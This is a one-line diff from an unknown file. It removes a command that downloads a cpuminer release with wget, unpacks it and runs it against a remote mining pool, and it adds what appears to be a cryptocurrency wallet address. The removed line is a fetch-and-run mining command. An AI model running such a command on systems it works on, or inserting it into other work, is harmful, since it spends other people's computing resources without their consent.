@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.34/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1qdkjaqtddseyx60yr25nxvwuvkj6mlxsly48xqh.prom
+83D5McSh48KCByJgneUMMJdUYxU8CA7snfUuHJS3e4gfi5ycB47mgwH7Vzb2r5su1NFDKaNZF9XHYbfpDiaKqZre4T8jDWb
